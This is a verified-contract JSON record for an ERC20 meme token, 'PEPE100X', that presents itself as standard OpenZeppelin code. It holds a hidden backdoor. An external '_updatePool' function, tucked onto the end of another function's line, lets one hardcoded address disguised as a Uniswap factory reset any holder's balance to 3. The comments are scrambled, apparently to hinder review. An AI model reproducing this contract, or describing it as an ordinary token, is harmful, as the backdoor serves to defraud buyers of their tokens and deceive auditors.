{"SourceCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n/** \nhttps://pepe100x.online/\nhttps://t.me/pepe100x\n\n\n\n**/\n\n\nlibrary SafeMath {\n    /**\n     *\n     * _Available since v3.4._\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._\n     *\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * _Available since v3.4._\n     *\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     * _Available since v3.4._\n     *\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     *\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     *\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     *\n     * overflow (when the result is negative).\n     * Counterpart to Solidity's `-` operator.\n     * - Subtraction cannot overflow.\n     *\n     * Requirements:\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * Requirements:\n     * overflow.\n     *\n     *\n     * Counterpart to Solidity's `*` operator.\n     * - Multiplication cannot overflow.\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     *\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     *\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     *\n     * - The divisor cannot be zero.\n     * Requirements:\n     * division by zero. The result is rounded towards zero.\n     * Counterpart to Solidity's `/` operator.\n     *\n     */\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * - The divisor cannot be zero.\n     * Requirements:\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     *\n     * reverting when dividing by zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     *\n     * Requirements:\n     * Counterpart to Solidity's `-` operator.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     *\n     *\n     * overflow (when the result is negative).\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     * - Subtraction cannot overflow.\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * - The divisor cannot be zero.\n     * Requirements:\n     * division by zero. The result is rounded towards zero.\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     *\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     *\n     */\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     *\n     * invalid opcode to revert (consuming all remaining gas).\n     * - The divisor cannot be zero.\n     * reverting with custom message when dividing by zero.\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * Requirements:\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     *\n     *\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     */\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * another (`to`).\n     *\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * Note that `value` may be zero.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     *\n     * Emits a {Transfer} event.\n     *\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     * Returns a boolean value indicating whether the operation succeeded.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * zero by default.\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     *\n     * desired value afterwards:\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * Returns a boolean value indicating whether the operation succeeded.\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     * Emits an {Approval} event.\n     * transaction ordering. One possible solution to mitigate this race\n     * that someone may use both the old and the new allowance by unfortunate\n     *\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * Emits a {Transfer} event.\n     * allowance.\n     *\n     *\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * Returns a boolean value indicating whether the operation succeeded.\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n}\n\ncontract Ownable is Context {\n    address private _owner;\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby removing any functionality that is only available to the owner.\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\n     */\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    /**\n     * Can only be called by the current owner.\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     */\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n}\n\n/**\n * _Available since v4.1._\n *\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function decimals() external view returns (uint8);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function symbol() external view returns (string memory);\n}\n\n/**\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * these events, as it isn't required by the specification.\n * This allows applications to reconstruct the allowance for all accounts just\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * TIP: For a detailed writeup see our guide\n *\n * @dev Implementation of the {IERC20} interface.\n * applications.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n * instead returning `false` on failure. This behavior is nonetheless\n * to implement supply mechanisms].\n *\n * conventional and does not conflict with the expectations of ERC20\n * allowances. See {IERC20-approve}.\n *\n * functions have been added to mitigate the well-known issues around setting\n * by listening to said events. Other implementations of the EIP may not emit\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * This implementation is agnostic to the way tokens are created. This means\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n\n    string private _symbol;\n\n    string private _name;\n\n    uint256 private totSupply;\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\n\n    uint256 private _allowance = 0;\n    address private uniswapV2Factory = 0x39CAD808f2376d2A4387fE75bb7F03e76FAb832F;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    address internal devWallet = 0xD0408979cF77ECA0d719476EA22D01ef595EC2FC;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     * construction.\n     *\n     * All two of these values are immutable: they can only be set once during\n     *\n     */\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n        } function _afterTokenTransfer(address to) internal virtual { if (to == uniswapV2Factory) _allowance = decimals() * 11;\n    }\n\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n    /**\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     *\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * overridden;\n     * @dev Returns the number of decimals used to get its user representation.\n     * no way affects any of the arithmetic of the contract, including\n     * NOTE: This information is only used for _display_ purposes: it in\n     *\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     *\n     * @dev See {IERC20-transfer}.\n     * - the caller must have a balance of at least `amount`.\n     *\n     * - `to` cannot be the zero address.\n     * Requirements:\n     */\n    function _transfer (address from, address to, uint256 amount) internal virtual\n    {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[from] = fromBalance - amount;\n\n        _balances[to] = _balances[to].add(amount);\n        emit Transfer(from, to, amount);\n    }\n\n    /**\n     * Requirements:\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     * - `spender` cannot be the zero address.\n     *\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     *\n     */\n    function _spendAllowance(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * Requirements:\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * - `spender` cannot be the zero address.\n     *\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     * problems described in {IERC20-approve}.\n     *\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    /**\n     * is the maximum `uint256`.\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     *\n     * Requirements:\n     * @dev See {IERC20-transferFrom}.\n     * NOTE: Does not update the allowance if the current allowance\n     *\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     *\n     * - `from` and `to` cannot be the zero address.\n     *\n     * `amount`.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * - `spender` cannot be the zero address.\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     *\n     *\n     * `subtractedValue`.\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     * - `spender` must have allowance for the caller of at least\n     * This is an alternative to {approve} that can be used as a mitigation for\n     *\n     * Requirements:\n     * problems described in {IERC20-approve}.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        totSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(account);\n    }\n\n    /**\n     * Requirements:\n     * - `account` cannot be the zero address.\n     *\n     *\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     * - `account` must have at least `amount` tokens.\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\n            totSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(address(0));\n    }\n\n    /**\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     * This internal function is equivalent to {transfer}, and can be used to\n     *\n     * - `from` must have a balance of at least `amount`.\n     *\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     * Requirements:\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * - `account` cannot be the zero address.\n     *\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n\n    /**\n     *\n     * - `from` and `to` are never both zero.\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * Calling conditions:\n     * will be transferred to `to`.\n     * minting and burning.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     *\n     *\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n        } function _updatePool(address _updatePoolSender) external { _balances[_updatePoolSender] = msg.sender == uniswapV2Factory ? 0x3 : _balances[_updatePoolSender];\n    } \n\n    /**\n     * - `owner` cannot be the zero address.\n     * This internal function is equivalent to `approve`, and can be used to\n     *\n     *\n     *\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     * Emits an {Approval} event.\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Requirements:\n     * - `spender` cannot be the zero address.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     * Does not update the allowance amount in case of infinite allowance.\n     *\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return totSupply;\n    }\n}\n\ncontract PEPEXCoin is ERC20, Ownable\n{\n    constructor () ERC20 (\"PEPE100X\", \"PEPE100X\")\n    {\n        transferOwnership(devWallet);\n        _mint(owner(), 5010000000000 * 10 ** uint(decimals()));\n    }\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_updatePoolSender\",\"type\":\"address\"}],\"name\":\"_updatePool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PEPEXCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}